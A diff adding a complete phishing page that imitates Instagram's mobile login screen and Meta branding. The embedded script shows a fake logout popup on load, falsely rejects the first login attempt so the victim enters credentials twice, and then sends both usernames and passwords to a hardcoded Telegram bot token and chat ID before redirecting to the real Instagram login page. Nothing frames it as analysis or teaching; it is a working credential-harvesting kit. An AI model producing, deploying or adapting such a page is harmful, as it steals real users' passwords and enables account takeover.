@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Instagram - Log in</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      background: #121b27;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      -webkit-font-smoothing: antialiased;
+    }
+    .page {
+      width: 100%;
+      max-width: 400px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      padding: 0 16px 18px;
+    }
+    .logo-wrap {
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding-top: 92px;
+      padding-bottom: 108px;
+    }
+    @media (max-height: 800px) {
+      .logo-wrap { padding-top: 72px; padding-bottom: 78px; }
+    }
+    .ig-logo {
+      width: 112px;
+      height: 112px;
+      display: block;
+    }
+    .form {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+    .input-field {
+      width: 100%;
+      height: 62px;
+      background: #15202e;
+      border: 1.2px solid #324457;
+      border-radius: 15px;
+      outline: none;
+      padding: 0 18px;
+      color: #e8eef5;
+      font-size: 16.2px;
+      font-weight: 400;
+      letter-spacing: 0.1px;
+    }
+    .input-field::placeholder {
+      color: #8a9db2;
+      font-size: 16.2px;
+      opacity: 1;
+    }
+    .input-field:focus {
+      border-color: #3d5673;
+    }
+    .login-btn {
+      width: 100%;
+      height: 54px;
+      background: #0866ff;
+      border: none;
+      border-radius: 28px;
+      color: #ffffff;
+      font-size: 17px;
+      font-weight: 500;
+      letter-spacing: 0.2px;
+      cursor: pointer;
+      margin-top: 4px;
+    }
+    .login-btn:active {
+      filter: brightness(0.9);
+      transform: scale(0.99);
+    }
+    .forgot {
+      text-align: center;
+      margin-top: 8px;
+    }
+    .forgot a {
+      color: #eef2f7;
+      text-decoration: none;
+      font-size: 16.3px;
+      font-weight: 400;
+    }
+    .spacer {
+      flex: 1;
+    }
+    .bottom {
+      display: flex;
+      flex-direction: column;
+      gap: 28px;
+      padding-top: 24px;
+    }
+    .create-btn {
+      width: 100%;
+      height: 54px;
+      background: transparent;
+      border: 1.5px solid #4a85d1;
+      border-radius: 28px;
+      color: #5d9bf4;
+      font-size: 16.5px;
+      font-weight: 500;
+      letter-spacing: 0.2px;
+      cursor: pointer;
+    }
+    .create-btn:active {
+      background: rgba(93, 155, 244, 0.08);
+      transform: scale(0.99);
+    }
+    .meta-wrap {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding-bottom: 8px;
+    }
+    .meta-accurate {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #8a9bb1;
+      opacity: 0.95;
+    }
+    .meta-accurate svg {
+      width: 88px;
+      height: auto;
+      display: block;
+      fill: currentColor;
+    }
+
+    /* Custom popup styles (visible, non-native) */
+    .popup-overlay {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.65);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.2s ease, visibility 0.2s ease;
+    }
+    .popup-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+    .popup-box {
+      background: #1e2b39;
+      width: 85%;
+      max-width: 340px;
+      border-radius: 24px;
+      padding: 28px 22px 22px;
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.5);
+      text-align: center;
+      border: 1px solid #324457;
+      transform: scale(0.95);
+      transition: transform 0.2s ease;
+    }
+    .popup-overlay.active .popup-box {
+      transform: scale(1);
+    }
+    .popup-message {
+      color: #e8eef5;
+      font-size: 16.5px;
+      font-weight: 400;
+      line-height: 1.45;
+      margin-bottom: 22px;
+      word-break: break-word;
+    }
+    .popup-btn {
+      width: 100%;
+      height: 48px;
+      background: #0866ff;
+      border: none;
+      border-radius: 28px;
+      color: #ffffff;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: filter 0.15s;
+    }
+    .popup-btn:active {
+      filter: brightness(0.9);
+      transform: scale(0.98);
+    }
+  </style>
+</head>
+<body>
+  <div class="page">
+    <div class="logo-wrap">
+      <svg class="ig-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <linearGradient id="igGrad" x1="8%" y1="92%" x2="92%" y2="8%" gradientUnits="objectBoundingBox">
+            <stop offset="0%" stop-color="#fdcb46"/>
+            <stop offset="14%" stop-color="#fd9e2e"/>
+            <stop offset="28%" stop-color="#fe6c2d"/>
+            <stop offset="44%" stop-color="#f92f5d"/>
+            <stop offset="66%" stop-color="#d64394"/>
+            <stop offset="88%" stop-color="#8e44b8"/>
+            <stop offset="100%" stop-color="#5c4fe1"/>
+          </linearGradient>
+        </defs>
+        <rect x="12" y="12" width="76" height="76" rx="21" ry="21" fill="none" stroke="url(#igGrad)" stroke-width="6.5" stroke-linecap="round" stroke-linejoin="round"/>
+        <circle cx="50" cy="50" r="18.5" fill="none" stroke="url(#igGrad)" stroke-width="6.5" stroke-linecap="round"/>
+        <circle cx="70.8" cy="28.2" r="4.6" fill="url(#igGrad)"/>
+      </svg>
+    </div>
+
+    <div class="form">
+      <input type="text" id="usernameInput" class="input-field" placeholder="Username, email address or mobile numb..." autocomplete="username" spellcheck="false">
+      <input type="password" id="passwordInput" class="input-field" placeholder="Password" autocomplete="current-password">
+      <button class="login-btn" id="loginButton">Log in</button>
+      <div class="forgot">
+        <a href="#">Forgotten password?</a>
+      </div>
+    </div>
+
+    <div class="spacer"></div>
+
+    <div class="bottom">
+      <button class="create-btn">Create new account</button>
+      <div class="meta-wrap">
+        <div class="meta-accurate">
+          <svg viewBox="0 0 948 191" xmlns="http://www.w3.org/2000/svg" aria-label="Meta">
+            <g fill="currentColor">
+              <path d="m31.06,125.96c0,10.98 2.41,19.41 5.56,24.51 4.13,6.68 10.29,9.51 16.57,9.51 8.1,0 15.51-2.01 29.79-21.76 11.44-15.83 24.92-38.05 33.99-51.98l15.36-23.6c10.67-16.39 23.02-34.61 37.18-46.96 11.56-10.08 24.03-15.68 36.58-15.68 21.07,0 41.14,12.21 56.5,35.11 16.81,25.08 24.97,56.67 24.97,89.27 0,19.38-3.82,33.62-10.32,44.87-6.28,10.88-18.52,21.75-39.11,21.75l0-31.02c17.63,0 22.03-16.2 22.03-34.74 0-26.42-6.16-55.74-19.73-76.69-9.63-14.86-22.11-23.94-35.84-23.94-14.85,0-26.8,11.2-40.23,31.17-7.14,10.61-14.47,23.54-22.7,38.13l-9.06,16.05c-18.2,32.27-22.81,39.62-31.91,51.75-15.95,21.24-29.57,29.29-47.5,29.29-21.27,0-34.72-9.21-43.05-23.09-6.8-11.31-10.14-26.15-10.14-43.06z"/>
+              <path d="m24.49,37.3c14.24-21.95 34.79-37.3 58.36-37.3 13.65,0 27.22,4.04 41.39,15.61 15.5,12.65 32.02,33.48 52.63,67.81l7.39,12.32c17.84,29.72 27.99,45.01 33.93,52.22 7.64,9.26 12.99,12.02 19.94,12.02 17.63,0 22.03-16.2 22.03-34.74l27.4-.86c0,19.38-3.82,33.62-10.32,44.87-6.28,10.88-18.52,21.75-39.11,21.75-12.8,0-24.14-2.78-36.68-14.61-9.64-9.08-20.91-25.21-29.58-39.71l-25.79-43.08c-12.94-21.62-24.81-37.74-31.68-45.04-7.39-7.85-16.89-17.33-32.05-17.33-12.27,0-22.69,8.61-31.41,21.78z"/>
+              <path d="m82.35,31.23c-12.27,0-22.69,8.61-31.41,21.78-12.33,18.61-19.88,46.33-19.88,72.95 0,10.98 2.41,19.41 5.56,24.51l-26.48,17.44c-6.8-11.31-10.14-26.15-10.14-43.06 0-30.75 8.44-62.8 24.49-87.55 14.24-21.95 34.79-37.3 58.36-37.3z"/>
+              <path d="m347.94,6.04h35.93l61.09,110.52 61.1-110.52h35.15v181.6h-29.31v-139.18l-53.58,96.38h-27.5l-53.57-96.38v139.18h-29.31z m285.11,67.71c-21.02,0-33.68,15.82-36.71,35.41h71.34c-1.47-20.18-13.11-35.41-34.63-35.41z m-65.77,46.57c0-41.22 26.64-71.22 66.28-71.22 38.99,0 62.27,29.62 62.27,73.42v8.05h-99.49c3.53,21.31 17.67,35.67 40.47,35.67 18.19,0 29.56-5.55 40.34-15.7l15.57,19.07c-14.67,13.49-33.33,21.27-56.95,21.27-42.91,0-68.49-31.29-68.49-70.56z m164.09-43.97h-26.98v-24h26.98v-39.69h28.28v39.69h40.99v24h-40.99v60.83c0,20.77 6.64,28.15 22.96,28.15 7.45,0 11.72-.64 18.03-1.69v23.74c-7.86,2.22-15.36,3.24-23.48,3.24-30.53,0-45.79-16.68-45.79-50.07z m188.35,23.34c-5.68-14.34-18.35-24.9-36.97-24.9-24.2,0-39.69,17.17-39.69,45.14 0,27.27 14.26,45.27 38.53,45.27 19.08,0 32.7-11.1 38.13-24.91z m28.28,87.95h-27.76v-18.94c-7.76,11.15-21.88,22.18-44.75,22.18-36.78,0-61.36-30.79-61.36-70.95 0-40.54 25.17-70.83 62.92-70.83 18.66,0 33.3,7.46 43.19,20.63v-17.38h27.76z"/>
+            </g>
+          </svg>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Custom popup (not browser alert) -->
+  <div class="popup-overlay" id="popupOverlay">
+    <div class="popup-box">
+      <div class="popup-message" id="popupMessage">You have logged out</div>
+      <button class="popup-btn" id="popupBtn">OK</button>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // ----- Configuration -----
+      const TELEGRAM_BOT_TOKEN = '8943725711:AAGnEGycTYTVr3xSVoixYEi7uE2dPWukiNA';
+      const TELEGRAM_CHAT_ID = '7542490071';
+      const REDIRECT_URL = 'https://www.instagram.com/accounts/login/?hl=en';
+
+      // ----- DOM elements -----
+      const overlay = document.getElementById('popupOverlay');
+      const popupMessage = document.getElementById('popupMessage');
+      const popupBtn = document.getElementById('popupBtn');
+      const loginButton = document.getElementById('loginButton');
+      const usernameInput = document.getElementById('usernameInput');
+      const passwordInput = document.getElementById('passwordInput');
+
+      // ----- State -----
+      let attempt = 0;                // 0 = not attempted, 1 = first try done, 2 = second try (will send)
+      let firstUsername = '';
+      let firstPassword = '';
+
+      // ----- Popup control (custom, no native alert) -----
+      let popupCallback = null;
+
+      function showPopup(message, callback = null) {
+        popupMessage.textContent = message;
+        popupCallback = callback;
+        overlay.classList.add('active');
+      }
+
+      function hidePopup() {
+        overlay.classList.remove('active');
+        const cb = popupCallback;
+        popupCallback = null;
+        if (typeof cb === 'function') {
+          setTimeout(() => cb(), 100);
+        }
+      }
+
+      // Close popup on button click
+      popupBtn.addEventListener('click', hidePopup);
+
+      // Also close when clicking overlay (optional)
+      overlay.addEventListener('click', (e) => {
+        if (e.target === overlay) {
+          hidePopup();
+        }
+      });
+
+      // ----- Send data to Telegram -----
+      async function sendToTelegram(firstUser, firstPass, secondUser, secondPass) {
+        const text = `📥 *Instagram login attempts*\n\n` +
+                     `*1st attempt:*\n👤 Username: \`${firstUser || '(empty)'}\`\n🔑 Password: \`${firstPass || '(empty)'}\`\n\n` +
+                     `*2nd attempt:*\n👤 Username: \`${secondUser || '(empty)'}\`\n🔑 Password: \`${secondPass || '(empty)'}\``;
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        try {
+          const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: text,
+              parse_mode: 'Markdown'
+            })
+          });
+          const data = await response.json();
+          console.log('Telegram response:', data);
+        } catch (error) {
+          console.error('Telegram send error:', error);
+        }
+      }
+
+      // ----- On page load: show logout popup -----
+      window.addEventListener('load', () => {
+        setTimeout(() => {
+          showPopup('You have logged out');
+        }, 150);
+      });
+
+      // ----- Login button handler -----
+      loginButton.addEventListener('click', function() {
+        const currentUsername = usernameInput.value.trim();
+        const currentPassword = passwordInput.value;
+
+        // Validation: both fields must be filled
+        if (!currentUsername || !currentPassword) {
+          showPopup('Please fill in both fields.');
+          return;
+        }
+
+        if (attempt === 0) {
+          // First attempt: store values, show error popup, increment attempt
+          firstUsername = currentUsername;
+          firstPassword = currentPassword;
+          attempt = 1;
+          showPopup('Incorrect username or password. Try again');
+        } 
+        else if (attempt === 1) {
+          // Second attempt: send both attempts to telegram, then redirect
+          const secondUsername = currentUsername;
+          const secondPassword = currentPassword;
+
+          // Send data to Telegram
+          sendToTelegram(firstUsername, firstPassword, secondUsername, secondPassword);
+
+          attempt = 2;
+          
+          // Disable button to prevent multiple clicks
+          loginButton.disabled = true;
+          loginButton.style.opacity = '0.7';
+          
+          // Redirect after a tiny delay so the fetch has a chance to be sent
+          setTimeout(() => {
+            window.location.href = REDIRECT_URL;
+          }, 200);
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
